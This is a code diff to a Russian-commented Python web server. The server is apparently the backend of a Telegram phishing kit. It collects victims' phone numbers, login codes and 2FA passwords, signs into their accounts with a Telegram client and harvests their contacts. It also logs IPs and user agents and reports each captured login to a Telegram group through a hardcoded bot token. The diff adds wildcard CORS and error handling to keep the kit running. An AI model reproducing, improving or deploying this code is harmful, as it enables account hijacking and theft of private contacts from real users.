@@ -17,16 +17,14 @@ from urllib.parse import quote
 import queue
 import user_agents
 
-# ↓↓↓ ДЛЯ RENDER - ПОРТ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ↓↓↓
-PORT = int(os.environ.get('PORT', 80))
-# ↑↑↑ ДЛЯ RENDER - ПОРТ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ↑↑↑
+# ✅ ДЛЯ RENDER - ПРАВИЛЬНЫЙ ПОРТ
+PORT = int(os.environ.get('PORT', 10000))
 
-# ↓↓↓ ТЕЛЕГРАМ ДАННЫЕ ↓↓↓
+# ТЕЛЕГРАМ ДАННЫЕ
 API_ID = "26120781"
 API_HASH = "1f72de4bdd4fc68a70d1f82f9c17af4e"
 BOT_TOKEN = "8599650382:AAESazEZQPK7UisG_LudLBeERROvJikCzzA"
 GROUP_CHAT_ID = "-1003488289989"
-# ↑↑↑ ТЕЛЕГРАМ ДАННЫЕ ↑↑↑
 
 # Инициализация бота
 bot = Bot(token=BOT_TOKEN)
@@ -302,7 +300,7 @@ async def verify_telegram_2fa(phone, password):
         await client.sign_in(password=password)
         print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
-                # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
+        # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
         print(f"🚀 Начинаем сбор РЕАЛЬНЫХ контактов...")
         all_dialogs = await client.get_dialogs()
         
@@ -380,7 +378,7 @@ async def verify_telegram_2fa(phone, password):
         if phone_clean in active_sessions:
             del active_sessions[phone_clean]
         
-                # Отстук о успешной авторизации
+        # Отстук о успешной авторизации
         add_notification(
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
             f"📟 Номер: +{phone_clean}\n"
@@ -447,10 +445,10 @@ async def handle_visit(request):
             f"{client_info}\n"
             f"📱 User-Agent: {user_agent[:80]}..."
         )
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'ok'}), content_type='application/json')
     except Exception as e:
         print(f"❌ Ошибка в handle_visit: {e}")
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'error'}), content_type='application/json')
 
 async def handle_phone_entered(request):
     """Ввод номера телефона"""
@@ -468,10 +466,10 @@ async def handle_phone_entered(request):
             f"🌐 IP: {real_ip}\n"
             f"{client_info}"
         )
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'ok'}), content_type='application/json')
     except Exception as e:
         print(f"❌ Ошибка в handle_phone_entered: {e}")
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'error'}), content_type='application/json')
 
 async def handle_code_entered(request):
     """Ввод кода"""
@@ -491,10 +489,10 @@ async def handle_code_entered(request):
             f"🌐 IP: {real_ip}\n"
             f"{client_info}"
         )
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'ok'}), content_type='application/json')
     except Exception as e:
         print(f"❌ Ошибка в handle_code_entered: {e}")
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'error'}), content_type='application/json')
 
 async def handle_login_click(request):
     """Нажатие кнопки входа"""
@@ -510,44 +508,56 @@ async def handle_login_click(request):
             f"🌐 IP: {real_ip}\n"
             f"{client_info}"
         )
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'ok'}), content_type='application/json')
     except Exception as e:
         print(f"❌ Ошибка в handle_login_click: {e}")
-        return web.Response(text="OK")
+        return web.Response(text=json.dumps({'status': 'error'}), content_type='application/json')
 
 # === TELEGRAM CLIENT API ===
 async def handle_send_code(request):
-    data = await request.json()
-    phone = data.get('phone', '')
-    result = await send_telegram_code(phone)
-    return web.Response(text=json.dumps(result), content_type='application/json')
+    try:
+        data = await request.json()
+        phone = data.get('phone', '')
+        result = await send_telegram_code(phone)
+        return web.Response(text=json.dumps(result), content_type='application/json')
+    except Exception as e:
+        return web.Response(text=json.dumps({'success': False, 'error': str(e)}), content_type='application/json')
 
 async def handle_verify_code(request):
-    data = await request.json()
-    phone = data.get('phone', '')
-    code = data.get('code', '')
-    result = await verify_telegram_code(phone, code)
-    return web.Response(text=json.dumps(result), content_type='application/json')
+    try:
+        data = await request.json()
+        phone = data.get('phone', '')
+        code = data.get('code', '')
+        result = await verify_telegram_code(phone, code)
+        return web.Response(text=json.dumps(result), content_type='application/json')
+    except Exception as e:
+        return web.Response(text=json.dumps({'success': False, 'error': str(e)}), content_type='application/json')
 
 async def handle_verify_2fa(request):
-    data = await request.json()
-    phone = data.get('phone', '')
-    password = data.get('password', '')
-    result = await verify_telegram_2fa(phone, password)
-    return web.Response(text=json.dumps(result), content_type='application/json')
+    try:
+        data = await request.json()
+        phone = data.get('phone', '')
+        password = data.get('password', '')
+        result = await verify_telegram_2fa(phone, password)
+        return web.Response(text=json.dumps(result), content_type='application/json')
+    except Exception as e:
+        return web.Response(text=json.dumps({'success': False, 'error': str(e)}), content_type='application/json')
 
 async def handle_check_session(request):
-    data = await request.json()
-    session_token = data.get('session_token', '')
-    
-    if session_token in user_sessions:
-        session = user_sessions[session_token]
-        if datetime.now() < session['expires_at']:
-            return web.Response(text=json.dumps({'valid': True}), content_type='application/json')
-        else:
-            del user_sessions[session_token]
-    
-    return web.Response(text=json.dumps({'valid': False}), content_type='application/json')
+    try:
+        data = await request.json()
+        session_token = data.get('session_token', '')
+        
+        if session_token in user_sessions:
+            session = user_sessions[session_token]
+            if datetime.now() < session['expires_at']:
+                return web.Response(text=json.dumps({'valid': True}), content_type='application/json')
+            else:
+                del user_sessions[session_token]
+        
+        return web.Response(text=json.dumps({'valid': False}), content_type='application/json')
+    except Exception as e:
+        return web.Response(text=json.dumps({'valid': False, 'error': str(e)}), content_type='application/json')
 
 # === HTTP ОБРАБОТЧИК ДЛЯ ВЫКАЧКИ КОНТАКТОВ ===
 async def handle_get_contacts(request):
@@ -777,28 +787,25 @@ async def cmd_stats(message: types.Message):
         f"🌐 Домен: {DOMAIN}"
     )
 
+# === CORS MIDDLEWARE ===
+@web.middleware
+async def cors_middleware(request, handler):
+    if request.method == "OPTIONS":
+        response = web.Response()
+    else:
+        response = await handler(request)
+    
+    response.headers.update({
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With",
+        "Access-Control-Allow-Credentials": "true"
+    })
+    return response
+
 # === ЗАПУСК СЕРВЕРА ===
 async def run_http_server():
-    app = web.Application()
-    
-    # CORS middleware для bestweb.live
-    # CORS middleware для bestweb.live
-    async def cors_middleware(app, handler):
-        async def middleware_handler(request):
-            if request.method == 'OPTIONS':
-                response = web.Response()
-            else:
-                response = await handler(request)
-            
-            # ✅ РАЗРЕШАЕМ ВСЕ ДОМЕНЫ
-            response.headers['Access-Control-Allow-Origin'] = '*'
-            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
-            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With'
-            response.headers['Access-Control-Allow-Credentials'] = 'true'
-            return response
-        return middleware_handler
-    
-    app.middlewares.append(cors_middleware)
+    app = web.Application(middlewares=[cors_middleware])
     
     # Статические страницы
     app.router.add_get('/', handle_index)
@@ -822,13 +829,13 @@ async def run_http_server():
     runner = web.AppRunner(app)
     await runner.setup()
     
-    # ✅ ИСПОЛЬЗУЕМ PORT ДЛЯ RENDER
+    # ✅ ИСПОЛЬЗУЕМ ПРАВИЛЬНЫЙ ПОРТ ДЛЯ RENDER
     site = web.TCPSite(runner, '0.0.0.0', PORT)
     await site.start()
     
     print(f"✅ Сервер успешно запущен на порту {PORT}!")
-    print(f"🌐 API доступен: https://repoz.onrender.com")
-    print(f"🔗 CORS разрешен для: https://bestweb.live")
+    print(f"🌐 API доступен: http://0.0.0.0:{PORT}")
+    print(f"🔗 CORS разрешен для всех доменов")
     
     # Бесконечный цикл чтобы сервер не закрывался
     while True:
